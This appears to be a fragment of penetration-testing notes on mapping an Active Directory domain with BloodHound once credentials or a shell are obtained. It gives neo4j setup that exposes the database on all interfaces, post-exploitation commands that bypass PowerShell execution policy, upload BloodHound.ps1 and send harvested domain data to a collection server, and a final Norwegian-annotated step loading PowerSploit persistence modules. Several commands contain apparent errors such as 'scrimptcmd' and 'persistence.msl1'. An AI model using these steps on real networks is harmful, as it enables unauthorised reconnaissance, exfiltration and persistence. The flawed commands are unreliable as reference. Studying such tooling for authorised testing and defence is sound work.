### Mapping AD with BloodHound

One of the glorious design features of AD is that everyone needs to know where everything is. So when you get user credentials and/or a shell, you can basically map the entire domain. Any user can query Active Directory for groups and sessions.

Now we can use that to make a cool GUI map of the entire AD which can be quirired in using BloodHound. Do the following:

- [Set up neo4j](https://neo4j.com/developer/kb/how-do-i-enable-remote-https-access-with-neo4j-30x/)
- Run neo4j from `/opt/neo4j-community-3.1.1/bin/neo4j start`
- Navigate to localhost:7474 in your browser.
- Set a new password for the neo4j account.
- Edit neo4j.conf and set the following parameters to make any host be able to access the database.
```
dbms.connector.http.enabled=true
dbms.connector.http.listen_address=0.0.0.0:7474
```
- Restart neo4j with  `/opt/neo4j-community-3.1.1/bin/neo4j restart`
- Launch bloodhound and log in to the neo4j database


The old method:
```
powershell -exec bypass
upload /path/bloodhound.ps1
Import-Module ./BloodHound.ps1
Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"
```

The new method:
```
scriptimport /path/to/powershell-script.ps1
scrimptcmd Invoke-BloodHound -URI http://SERVER:7474/ -UserPass "user:pass"
```

You should now see data being populated into the database and you can play with BloodHound to create really some really cool maps. You can also perform queries to show the shortest path to DA, etc.


kan nå laste opp powersploit moduler.
upload /path/powersploit/persistence.msl1
import-module ./persistence.msl1
Get-SecurityPackages
